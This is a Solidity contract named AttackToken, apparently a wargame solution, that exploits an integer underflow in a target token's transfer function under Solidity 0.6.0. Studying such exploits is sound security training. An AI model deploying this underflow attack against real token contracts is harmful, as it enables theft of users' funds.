// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import 'OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/math/SafeMath.sol';
import 'interfaces/Itoken.sol';

contract AttackToken {
// The contract uses solidity 0.6.0 which is subject to overflow.
  address public owner;
  IToken itoken;

  constructor(address _addr) public {
    owner = msg.sender;
    itoken = IToken(_addr);
  }

  function transfer(address _addr) public {
    itoken.transfer(_addr, 1000000);
  }
}